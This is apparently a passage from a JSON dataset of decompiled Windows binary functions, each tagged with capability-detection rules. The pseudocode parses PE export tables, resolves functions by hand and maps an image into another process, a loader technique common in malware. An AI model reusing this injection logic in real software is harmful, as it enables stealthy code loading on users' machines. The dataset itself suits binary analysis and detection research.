        "decompiled_code": "\nint32_t __cdecl fcn.0005ca40(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t *arg_14h, int32_t *arg_18h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_44h;\n    int16_t *var_40h;\n    uint var_3ch;\n    uint var_34h;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_24h;\n    int16_t *var_20h;\n    char var_19h;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_8h = 0xffffffff;\n    var_4h = NULL;\n    var_14h = 0;\n    var_10h = 0;\n    *arg_14h = 0;\n    var_8h = fcn.00035e20(arg_ch, 0x8000);\n    if (var_8h == -1) {\n        var_4h = fcn.000356c0(0x208);\n        if (var_4h == NULL) {\n            return 0x21590004;\n        }\n        var_18h = fcn.00034fd0(var_4h, 0x104);\n        if (var_18h != 0) goto code_r0x0005cd0e;\n        if (arg_8h == 0) {\n            var_19h = '\\0';\n        }\n        else {\n            var_18h = fcn.0005a7d0(&var_14h, 0x400, arg_8h);\n            if ((var_18h != 0) || (var_18h = fcn.0005a4f0(0xffffffff, &var_19h),  var_18h != 0)) goto code_r0x0005cd0e;\n        }\n        if (var_19h == '\\0') {\n            var_20h = var_4h;\n            do {\n                iVar1 = *var_20h;\n                var_20h = var_20h + 1;\n            } while (iVar1 != 0);\n            fcn.00078a5c(var_4h, 0x8005577c, 0x104 - (var_20h - (var_4h + 1) >> 1));\n        }\n        else {\n            var_30h = var_4h;\n            do {\n                iVar1 = *var_30h;\n                var_30h = var_30h + 1;\n            } while (iVar1 != 0);\n            fcn.00078a5c(var_4h, 0x80055794, 0x104 - (var_30h - (var_4h + 1) >> 1));\n        }\n        var_40h = var_4h;\n        do {\n            iVar1 = *var_40h;\n            var_40h = var_40h + 1;\n        } while (iVar1 != 0);\n        fcn.00078a5c(var_4h, arg_ch, 0x104 - (var_40h - (var_4h + 1) >> 1));\n        var_4h[0x103] = 0;\n        var_8h = fcn.00035e20(var_4h, 0);\n        if (var_8h == -1) {\n            var_18h = 0x21590005;\n            goto code_r0x0005cd0e;\n        }\n    }\n    var_ch = fcn.00035df0(var_8h);\n    if (var_ch == -1) {\n        var_18h = -1;\n    }\n    else {\n        var_10h = fcn.000356c0(var_ch);\n        if (var_10h == 0) {\n            var_18h = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.00036010(var_8h, var_10h, var_ch);\n            if (iVar2 == -1) {\n                var_18h = -1;\n            }\n            else {\n                var_ch = fcn.0005bdc0(var_10h);\n                iVar2 = fcn.000356c0(var_ch);\n                *arg_14h = iVar2;\n                if (*arg_14h == 0) {\n                    var_18h = 0x21590004;\n                }\n                else {\n                    var_18h = fcn.0005bea0(*arg_14h, var_10h);\n                    if (var_18h == 0) {\n                        if (arg_10h == 0) {\n                            var_50h = *arg_14h;\n                        }\n                        else {\n                            var_50h = arg_10h;\n                        }\n                        var_18h = fcn.0005b790(*arg_14h, var_50h);\n                        if ((var_18h == 0) && (arg_18h != NULL)) {\n                            *arg_18h = var_ch;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0005cd0e:\n    if (var_18h != 0) {\n        fcn.000357f0(*arg_14h);\n        *arg_14h = 0;\n    }\n    fcn.000357f0(var_10h);\n    fcn.0005a850(var_14h);\n    fcn.000357f0(var_4h);\n    if (var_8h != -1) {\n        fcn.00036000(var_8h);\n    }\n    return var_18h;\n}\n",
        "token_count": 1329
    },
    "0005cd70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005cd70(int32_t arg_8h, char *arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint16_t uVar8;\n    uint32_t *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint var_48h;\n    uint var_40h;\n    char *var_3ch;\n    uint32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_30h = 0x21590066;\n    }\n    else if (arg_ch == NULL) {\n        var_30h = 0x21590067;\n    }\n    else if (arg_10h == NULL) {\n        var_30h = 0x21590068;\n    }\n    else {\n        iVar6 = arg_8h + *(arg_8h + 0x3c);\n        puVar9 = iVar6 + 0x78;\n        if (*puVar9 == 0) {\n            var_30h = 0x21590005;\n        }\n        else {\n            iVar10 = arg_8h + *puVar9;\n            iVar7 = arg_8h + *(iVar10 + 0x1c);\n            iVar11 = arg_8h + *(iVar10 + 0x20);\n            if ((arg_ch & 0xffff0000) == 0) {\n                uVar8 = arg_ch - *(iVar10 + 0x10);\n                if (uVar8 < *(iVar10 + 0x14) || uVar8 == *(iVar10 + 0x14)) {\n                    uVar3 = *(iVar7 + uVar8 * 4);\n                    if ((uVar3 < *puVar9) || (*puVar9 + *(iVar6 + 0x7c) <= uVar3)) {\n                        *arg_10h = arg_8h + uVar3;\n                        var_30h = 0;\n                    }\n                    else {\n                        var_30h = fcn.0005cfd0(arg_8h + uVar3, arg_10h);\n                    }\n                }\n                else {\n                    var_30h = 0x21590005;\n                }\n            }\n            else {\n                var_3ch = arg_ch;\n                do {\n                    cVar1 = *var_3ch;\n                    var_3ch = var_3ch + 1;\n                } while (cVar1 != '\\0');\n                uVar3 = var_3ch - (arg_ch + 1);\n                var_30h = 0x21590005;\n                for (var_10h = 0; var_10h < *(iVar10 + 0x18); var_10h = var_10h + 1) {\n                    uVar2 = *(iVar7 + *(arg_8h + *(iVar10 + 0x24) + var_10h * 2) * 4);\n                    if ((uVar3 < (*puVar9 + *(iVar6 + 0x7c)) - *(iVar11 + var_10h * 4)) &&\n                       (iVar4 = arg_8h + *(iVar11 + var_10h * 4),  *(iVar4 + uVar3) == '\\0')) {\n                        for (var_38h = 0; (var_38h < uVar3 && (*(iVar4 + var_38h) == arg_ch[var_38h]));\n                            var_38h = var_38h + 1) {\n                        }\n                        if (uVar3 <= var_38h) {\n                            if ((*puVar9 <= uVar2) && (uVar2 < *puVar9 + *(iVar6 + 0x7c))) {\n                                uVar5 = fcn.0005cfd0(arg_8h + uVar2, arg_10h);\n                                return uVar5;\n                            }\n                            *arg_10h = arg_8h + uVar2;\n                            return 0;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return var_30h;\n}\n",
        "token_count": 1036
    },
    "0005cfd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005cfd0(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_118h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = fcn.00035380(arg_8h, 0x2e);\n    if (var_ch == 0) {\n        var_10h = 0x2159000d;\n    }\n    else {\n        var_ch = var_ch + 1;\n        var_4h = var_ch - arg_8h;\n        if (var_4h < 0x104) {\n            fcn.00035340(&var_118h, arg_8h, var_4h);\n            *(&var_118h + var_4h) = 0;\n            var_10h = fcn.00034f40(&var_118h, &var_8h);\n            if (var_10h == 0) {\n                var_10h = fcn.0005cd70(var_8h, var_ch, arg_ch);\n            }\n        }\n        else {\n            var_10h = 0x2159000b;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 289
    },
    "0005d070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005d070(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == 0) {\n        iVar1 = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        iVar1 = 0x21590067;\n    }\n    else if (arg_14h == 0) {\n        iVar1 = 0x21590068;\n    }\n    else {\n        iVar1 = fcn.00058500(arg_8h, arg_ch, &var_4h);\n        if (iVar1 == 0) {\n            if (var_4h == 0) {\n                iVar1 = 0x21590005;\n            }\n            else {\n                iVar1 = fcn.0005c820(arg_8h, arg_ch, arg_10h, arg_14h);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 247
    },
    "0005d0f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005d0f0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    if (arg_ch == 0) {\n        return 0x21590066;\n    }\n    if (arg_10h != 0) {\n        var_10h = fcn.000356c0(0x20a);\n        if (var_10h == 0) {\n            var_4h = 0x21590004;\n            goto code_r0x0005d1e6;\n        }\n        iVar1 = fcn.00078b8e(var_10h, arg_10h, 0x104);\n        if (iVar1 == -1) {\n            var_4h = 0x21590066;\n            goto code_r0x0005d1e6;\n        }\n        *(var_10h + iVar1 * 2) = 0;\n    }\n    if (arg_14h != 0) {\n        var_ch = fcn.000356c0(0x20a);\n        if (var_ch == 0) {\n            var_4h = 0x21590004;\n            goto code_r0x0005d1e6;\n        }\n        iVar1 = fcn.00078b8e(var_ch, arg_14h, 0x104);\n        if (iVar1 == -1) {\n            var_4h = 0x21590066;\n            goto code_r0x0005d1e6;\n        }\n        *(var_ch + iVar1 * 2) = 0;\n    }\n    var_4h = fcn.0005d210(arg_8h, arg_ch, var_10h, var_ch, arg_18h);\ncode_r0x0005d1e6:\n    fcn.000357f0(var_ch);\n    fcn.000357f0(var_10h);\n    return var_4h;\n}\n",
        "token_count": 502
    },
    "0005d210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005d210(int32_t param_1, uint32_t param_2, int32_t param_3, int32_t param_4, uint32_t *param_5)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    uint32_t var_ch;\n    int32_t var_10h_2;\n    int32_t var_14h;\n    uint32_t *var_18h_2;\n    uint var_18h;\n    uint *arg_ch;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t var_64h;\n    int32_t var_5ch;\n    uint32_t *var_58h;\n    char var_52h;\n    char var_51h;\n    int16_t *var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_20h;\n    uchar *var_19h;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x800b8dc0;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0005d210::var_10h;\n    *0x10 = &stack0xffffff8c;\n    var_4ch = 0;\n    var_50h = NULL;\n    var_58h = NULL;\n    var_20h = 0;\n    var_5ch = 0;\n    bVar2 = false;\n    var_51h = '\\0';\n    var_44h = 0;\n    var_40h = 0;\n    var_19h._0_1_ = '\\0';\n    if (var_ch == 0) {\n        var_64h = 0x21590066;\n        goto code_r0x0005d762;\n    }\n    var_4h = 0;\n    var_64h = fcn.0005a7d0(&fcn.0005d210::var_5ch, 0x438, var_8h);\n    if ((var_64h == 0) && (var_64h = fcn.0005c0a0(var_ch, 0),  var_64h == 0)) {\n        var_4ch = var_ch + *(var_ch + 0x3c);\n        var_50h = var_4ch + 0x18;\n        if (((*(var_4ch + 0x5c) == 1) && (var_8h != 0)) || ((*(var_4ch + 0x5c) != 1 && (var_8h == 0)))) {\n            var_64h = 0x21590206;\n        }\n        else {\n            var_64h = fcn.0005a540(var_5ch, &stack0xffffffaa);\n            if (var_64h == 0) {\n                if (var_52h == '\\0') {\n                    var_64h = 0x21590206;\n                }\n                else if (((var_52h == '\\0') || (*var_50h != 0x20b)) && ((var_52h != '\\0' || (*var_50h != 0x10b)))) {\n                    uVar4 = var_ch;\n                    var_3ch = fcn.0005bdc0(var_ch);\n                    var_20h = fcn.000356c0(var_3ch);\n                    if (var_20h == 0) {\n                        var_64h = 0x21590004;\n                    }\n                    else {\n                        fcn.00078bfa(var_20h, 0, var_3ch);\n                        var_64h = fcn.0005bea0(var_20h, var_ch);\n                        if (var_64h == 0) {\n                            if (var_5ch != 0) {\n                                var_64h = (**0x8005129c)(var_5ch, 0, 0, 0, &fcn.0005d210::var_40h, 0);\n                                if (var_64h < 0) goto code_r0x0005d6b1;\n                                iVar3 = (**0x800511c0)();\n                                if (var_40h != iVar3) {\n                                    (**0x800511c4)(var_40h, &fcn.0005d210::var_38h);\n                                    var_19h._0_1_ = '\\x01';\n                                }\n                            }\n                            var_4ch = var_20h + *(var_20h + 0x3c);\n                            var_50h = var_4ch + 0x18;\n                            var_44h = *(var_4ch + 0x34);\n                            arg_ch = &fcn.0005d210::var_44h;\n                            var_64h = fcn.0005a6c0(var_5ch, arg_ch, &fcn.0005d210::var_3ch);\n                            if (((var_64h == 0) && (var_64h = fcn.0005b790(var_20h, var_44h),  var_64h == 0)) &&\n                               (var_64h = fcn.0005a680(var_5ch, var_44h, 0, var_20h, var_3ch),  var_64h == 0)) {\n                                if (var_8h == 0) {\ncode_r0x0005d5f3:\n                                    var_64h = fcn.0005b9a0(var_8h, var_20h);\n                                    if (var_64h == 0) {\n                                        bVar2 = true;\n                                        uVar5 = 0x5d631;\n                                        var_64h = fcn.0005a680(var_5ch, var_44h, 0, var_20h, var_3ch);\n                                        if (var_64h == 0) {\n                                            if (*(var_4ch + 0x28) != 0) {\n                                                uVar5 = 1;\n                                                var_ch = var_44h + *(var_50h + 8);\n                                                uVar4 = var_44h;\n                                                var_64h = fcn.0005b420(var_8h, var_ch, var_44h, 1);\n                                                if (var_64h != 0) goto code_r0x0005d6b1;\n                                            }\n                                            if (var_8h != 0) {\n                                                fcn.000591e0(arg_ch, &fcn.0005d210::var_48h, var_8h, var_ch, uVar4, \n                                                             uVar5);\n                                            }\n                                            var_64h = 0;\n                                        }\n                                    }\n                                }\n                                else {\n                                    var_58h = fcn.000356c0(0x428);\n                                    if (var_58h == NULL) {\n                                        var_64h = 0x21590004;\n                                    }\n                                    else {\n                                        *var_58h = var_44h;\n                                        var_58h[1] = 0;\n                                        uVar1 = *(var_50h + 8);\n                                        var_58h[4] = var_44h + uVar1;\n                                        var_58h[5] = CARRY4(var_44h, uVar1);\n                                        var_58h[2] = *(var_50h + 0x1c);\n                                        var_58h[3] = *(var_4ch + 8);\n                                        if (var_10h_2 == 0) {\n                                            *(var_58h + 6) = 0;\n                                        }\n                                        else {\n                                            fcn.00078a08(var_58h + 6, var_10h_2, 0x104);\n                                            *(var_58h + 0x21e) = 0;\n                                        }\n                                        if (var_14h == 0) {\n                                            *(var_58h + 0x88) = 0;\n                                        }\n                                        else {\n                                            fcn.00078a08(var_58h + 0x88, var_14h, 0x104);\n                                            *(var_58h + 0x426) = 0;\n                                        }\n                                        var_64h = fcn.000588d0();\n                                        if (var_64h == 0) {\n                                            var_51h = '\\x01';\n                                            goto code_r0x0005d5f3;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    var_64h = 0x21590206;\n                }\n            }\n        }\n    }\ncode_r0x0005d6b1:\n    var_4h = 0xffffffff;\n    if (var_64h == 0) {\n        if (var_18h_2 != NULL) {\n            *var_18h_2 = var_44h;\n        }\n    }\n    else {\n        if (bVar2) {\n            fcn.0005de60(var_8h, var_44h, 0);\n        }\n        else if (var_44h != 0) {\n            if (var_51h != '\\0') {\n                fcn.000593d0(var_8h, var_44h);\n            }\n            fcn.0005a790(var_5ch, var_44h);\n        }\n        if (var_18h_2 != NULL) {\n            *var_18h_2 = 0;\n        }\n    }\n    if (var_5ch != 0) {\n        fcn.000789b4(var_5ch);\n    }\n    fcn.000357f0(var_20h);\n    fcn.000357f0(var_58h);\n    if (var_40h != 0) {\n        if (var_19h != '\\0') {\n            (**0x800511bc)(&fcn.0005d210::var_38h);\n        }\n        (**0x800512e0)();\n    }\ncode_r0x0005d762:\n    *in_FS_OFFSET = var_10h;\n    return var_64h;\n}\n",
        "token_count": 2342
    },
    "0005d780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0005d780(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        var_4h = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        var_4h = 0x21590067;\n    }\n    else {\n        arg_ch_00 = fcn.000356c0(0x20a);\n        if (arg_ch_00 == 0) {\n            var_4h = 0x21590004;\n        }\n        else {\n            iVar1 = fcn.00078b8e(arg_ch_00, arg_ch, 0x104);\n            if (iVar1 == -1) {\n                var_4h = 0x21590066;\n            }\n            else {\n                *(arg_ch_00 + iVar1 * 2) = 0;\n                var_4h = fcn.0005d830(arg_8h, arg_ch_00, arg_10h);\n            }\n            fcn.000357f0(arg_ch_00);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 298
    },
    "0005d830": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005d830(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_1ch;\n    code *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == 0) {\n        var_14h = 0x21590066;\n    }\n    else if (arg_10h == 0) {\n        var_14h = 0x21590067;\n    }\n    else {\n        var_10h = arg_8h;\n        var_ch = arg_ch;\n        var_8h = arg_10h;\n        iVar1 = fcn.00035150();\n        if ((iVar1 < 0x1b) || (uVar2 = fcn.00057d20(),  0x1fff < uVar2)) {\n            iVar1 = fcn.00035150();\n            if ((iVar1 < 0x1b) && (uVar2 = fcn.00057d20(),  uVar2 < 0xc00)) {\n                var_14h = 0x21590004;\n            }\n            else {\n                fcn.0005d920(&var_10h);\n                var_14h = var_4h;\n            }\n        }\n        else {\n            var_14h = fcn.00034f40(0x8005181c, &var_1ch);\n            if ((var_14h == 0) &&\n               ((var_14h = fcn.0005cd70(var_1ch, 0x800557ac, &var_18h),  var_14h == 0 &&\n                (iVar1 = (*var_18h)(0x8009d920, &var_10h, 0xe800, 1, 0),  var_14h = var_4h,  iVar1 != 0)))) {\n                var_14h = iVar1;\n            }\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 495
    },
    "0005d920": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0005de12)\n\nvoid __cdecl fcn.0005d920(uint *arg_8h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint var_a4h;\n    uint var_9ch;\n    int16_t *var_98h;\n    uint var_94h;\n    uint var_8ch;\n    int16_t *var_88h;\n    uint var_84h;\n    uint var_7ch;\n    int16_t *var_78h;\n    uint *var_70h;\n    uint var_6ch;\n    uint var_64h;\n    int16_t *var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint *var_4ch;\n    uint var_48h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int16_t *var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    char var_11h;\n    int32_t var_10h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    var_38h = 0;\n    var_30h = 0;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = NULL;\n    var_3ch = *arg_8h;\n    var_34h = arg_8h[1];\n    var_4ch = arg_8h[2];\n    if (var_34h != NULL) {\n        var_60h = var_34h;\n        do {\n            iVar1 = *var_60h;\n            var_60h = var_60h + 1;\n        } while (iVar1 != 0);\n        if (var_60h - (var_34h + 1) >> 1 != 0) {\n            if (var_4ch == NULL) {\n                arg_8h[3] = 0x21590067;\n                return;\n            }\n            *var_4ch = 0;\n            var_38h = fcn.000356c0(0x212);\n            if (var_38h == 0) {\n                arg_8h[3] = 0x21590004;\n                return;\n            }\n            fcn.00078a08(var_38h, var_34h, 0x104);\n            *(var_38h + 0x208) = 0;\n            iVar3 = fcn.00078a14(var_38h, 0x2e);\n            if ((iVar3 == 0) || (*(iVar3 + 2) == 0x5c)) {\n                puVar2 = var_38h + -2;\n                do {\n                    var_70h = puVar2;\n                    puVar2 = var_70h + 2;\n                } while (*(var_70h + 2) != 0);\n                *(var_70h + 2) = *0x800557cc;\n                *(var_70h + 6) = *0x800557d0;\n                *(var_70h + 10) = *0x800557d4;\n            }\n            var_4h = 0;\n            var_40h = fcn.0005e490(var_3ch, var_38h, 0x212, &var_4h);\n            if (var_40h == 0) {\n                var_5ch = fcn.00078a14(var_38h, 0x5c);\n                if (var_5ch == 0) {\n                    var_5ch = var_38h;\n                }\n                else {\n                    var_5ch = var_5ch + 2;\n                }\n                var_40h = fcn.00059530(var_3ch, var_5ch, var_4ch);\n                if (var_40h != 0) {\n                    fcn.000789c0(&var_48h, var_38h);\n                    var_2ch = 0x18;\n                    var_28h = 0;\n                    var_20h = 0x240;\n                    var_24h = &var_48h;\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_40h = fcn.0001f080(&var_30h, 0x80000000, &var_2ch, &var_54h, 0, 0, 7, 1, 0x40, 0, 0);\n                    if (var_40h != 0) {\n                        if (var_5ch != var_38h) goto code_r0x0005de00;\n                        var_8h = fcn.000356c0(0x208);\n                        if (var_8h == NULL) {\n                            var_40h = 0x21590004;\n                            goto code_r0x0005de00;\n                        }\n                        var_40h = fcn.00034fd0(var_8h, 0x104);\n                        if ((var_40h != 0) || (var_40h = fcn.0005a4f0(0xffffffff, &var_11h),  var_40h != 0))\n                        goto code_r0x0005de00;\n                        if (var_11h == '\\0') {\n                            var_78h = var_8h;\n                            do {\n                                iVar1 = *var_78h;\n                                var_78h = var_78h + 1;\n                            } while (iVar1 != 0);\n                            fcn.00078a5c(var_8h, 0x8005577c, 0x104 - (var_78h - (var_8h + 1) >> 1));\n                        }\n                        else {\n                            var_88h = var_8h;\n                            do {\n                                iVar1 = *var_88h;\n                                var_88h = var_88h + 1;\n                            } while (iVar1 != 0);\n                            fcn.00078a5c(var_8h, 0x80055794, 0x104 - (var_88h - (var_8h + 1) >> 1));\n                        }\n                        var_98h = var_8h;\n                        do {\n                            iVar1 = *var_98h;\n                            var_98h = var_98h + 1;\n                        } while (iVar1 != 0);\n                        fcn.00078a5c(var_8h, var_38h, 0x104 - (var_98h - (var_8h + 1) >> 1));\n                        var_8h[0x103] = 0;\n                        fcn.000789c0(&var_48h, var_8h);\n                        var_2ch = 0x18;\n                        var_28h = 0;\n                        var_20h = 0x240;\n                        var_24h = &var_48h;\n                        var_1ch = 0;\n                        var_18h = 0;\n                        var_40h = fcn.0001f080(&var_30h, 0x80000000, &var_2ch, &var_54h, 0, 0, 7, 1, 0x40, 0, 0);\n                        if (var_40h != 0) goto code_r0x0005de00;\n                    }\n                    var_2ch = 0x18;\n                    var_28h = 0;\n                    var_20h = 0x200;\n                    var_24h = NULL;\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_40h = fcn.00078b0a();\n                    if ((var_40h == 0) && (var_40h = fcn.00078af8(),  var_40h == 0)) {\n                        var_40h = fcn.0005d210();\n                    }\n                }\n            }\ncode_r0x0005de00:\n            fcn.000357f0(var_8h);\n            if (var_10h != 0) {\n                fcn.000789b4(var_10h);\n            }\n            if (var_30h != 0) {\n                fcn.000789b4(var_30h);\n            }\n            fcn.000357f0(var_38h);\n            arg_8h[3] = var_40h;\n            return;\n        }\n    }\n    arg_8h[3] = 0x21590066;\n    return;\n}\n",
        "token_count": 1986
    },
    "0005de60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0005de60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_1ch;\n    code *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    var_8h._0_1_ = arg_10h;\n    var_4h = -1;\n    iVar1 = fcn.00035150();\n    if ((iVar1 < 0x1b) || (uVar2 = fcn.00057d20(),  0x1fff < uVar2)) {\n        iVar1 = fcn.00035150();\n        if ((iVar1 < 0x1b) && (uVar2 = fcn.00057d20(),  uVar2 < 0xc00)) {\n            var_14h = 0x21590004;\n        }\n        else {\n            fcn.0005df30(&var_10h);\n            var_14h = var_4h;\n        }\n    }\n    else {\n        var_14h = fcn.00034f40(0x8005181c, &var_1ch);\n        if ((var_14h == 0) &&\n           ((var_14h = fcn.0005cd70(var_1ch, 0x800557ac, &var_18h),  var_14h == 0 &&\n            (iVar1 = (*var_18h)(0x8009df30, &var_10h, 0xe800, 1, 0),  var_14h = var_4h,  iVar1 != 0)))) {\n            var_14h = iVar1;\n        }\n    }\n    return var_14h;\n}\n",
        "token_count": 453
    },
    "0005df30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0005df30(int32_t *param_1)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    int32_t *var_8h;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_160h;\n    uint32_t var_124h;\n    int32_t var_11ch;\n    uint32_t var_118h;\n    int32_t var_114h;\n    int32_t var_110h;\n    int32_t var_e8h;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x800b8df0;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0005df30::var_10h;\n    puStack28 = &stack0xfffffe90;\n    var_114h = 0;\n    if (var_8h[1] == 0) {\n        var_11ch = 0x21590065;\n        puStack28 = &stack0xfffffe90;\n    }\n    else if (*var_8h == 0) {\n        var_11ch = 0;\n        puStack28 = &stack0xfffffe90;\n    }\n    else {\n        var_4h = 0;\n        iVar2 = var_8h[1];\n        var_11ch = fcn.00058500(*var_8h, iVar2, &fcn.0005df30::var_118h);\n        if (var_11ch == 0) {\n            if (var_118h == 0) {\n                var_11ch = 0;\n            }\n            else if (var_118h == 0xffffffff) {\n                var_11ch = 0;\n            }\n            else if ((var_118h == 0) || (var_11ch = fcn.00059c90(*var_8h, var_8h[1]),  var_11ch == 0)) {\n                if (var_118h < 2) {\n                    var_11ch = fcn.0005a7d0(&fcn.0005df30::var_114h, 0x18, *var_8h);\n                    if ((var_11ch == 0) &&\n                       (var_11ch = fcn.0005a640(var_114h, var_8h[1], 0, &fcn.0005df30::var_160h, 0x40),  var_11ch == 0))\n                    {\n                        if (var_160h == 0x5a4d) {\n                            uVar1 = 